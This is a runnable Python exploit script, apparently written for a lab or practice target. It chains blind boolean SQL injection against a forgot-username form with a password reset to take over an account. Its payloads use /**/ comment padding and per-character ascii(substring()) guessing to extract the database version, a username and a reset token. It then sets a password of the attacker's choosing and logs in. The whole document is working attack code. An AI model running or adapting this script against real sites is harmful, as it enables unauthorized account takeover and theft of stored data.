import sys, requests, argparse, re

s = requests.session()
proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "https://127.0.0.1:8080",
}

def delivery(ip, injStr):
    for i in range(32, 126):
        target = "http://%s/forgotusername.php" % ip
        payload = injStr.replace("[CHAR]", str(i))
        data = {'username': payload}
        req = s.post(target, data=data, proxies=proxies)
        contLen = int(req.headers['Content-Length'])
        if(contLen < 1480):
            return i
    return None

def inject(ip, inj):
    output = ""
    for i in range(1, 100):
        injectStr = "x'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/limit/**/1;--" % (inj, i)
        try:
            extractedChar = chr(delivery(ip, injectStr))
            sys.stdout.write(extractedChar)
            sys.stdout.flush()
            output = output + extractedChar
        except:
            break
    return output

def tokenRequest(ip, user):
    target = "http://%s/forgotpassword.php" % ip
    data = {'username': user}
    req = s.post(target, data=data, proxies=proxies)
    res = req.text
    if "Email sent!" in res:
        print("\n\n[+] Requesting password recovery...")
    if "User doesn't exist" in res:
        print("\n\n[!] Unexpected behavior: username not found.")

def passwordReset(ip, token, newpass):
    target = "http://%s/resetpassword.php" % ip
    data = {'token': token,
            'password1': newpass,
            'password2': newpass}
    req = s.post(target, data, proxies=proxies)
    res = req.text
    if "Password changed!" in res:
        print("\n\n[+] Password successfully changed to:", newpass)
    if "Token is invalid." in res:
        print("\n\n[!] Invalid token.")
        sys.exit(-1)

def authenticate(ip, user, password):
    target = "http://%s/login.php" % ip
    data = {'username': user,
            'password': password}
    req = s.post(target, data=data, allow_redirects=True)
    res = req.text
    usermatch = re.search(r'<div class="center_div">(.*?)<br>', res)
    if usermatch:
        output = usermatch.group(1)
        print(output)
    else:
        print("\n[!] Failed to authenticate.")
        sys.exit(-1)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', help='Target IP address', required=True)
    parser.add_argument('--password', help='Desired password to be defined', required=True)
    args = parser.parse_args()
    ip = args.ip
    newpass = args.password

    print("\n[+] Database version")
    payload = "select/**/version()"
    inject(ip, payload)
    print("\n\n[+] Retrieving username...")
    payload = "select/**/username/**/from/**/users/**/where/**/uid=2"
    username = inject(ip, payload)
    tokenRequest(ip, username)
    print("\n[+] Retrieving password reset token...")
    payload = "select/**/token/**/from/**/tokens/**/where/**/uid=2/**/limit/**/1"
    token = inject(ip, payload)
    passwordReset(ip, token, newpass)
    print("\n[+] Trying to authenticate...")
    authenticate(ip, username, newpass)


if __name__ == "__main__":
	main()
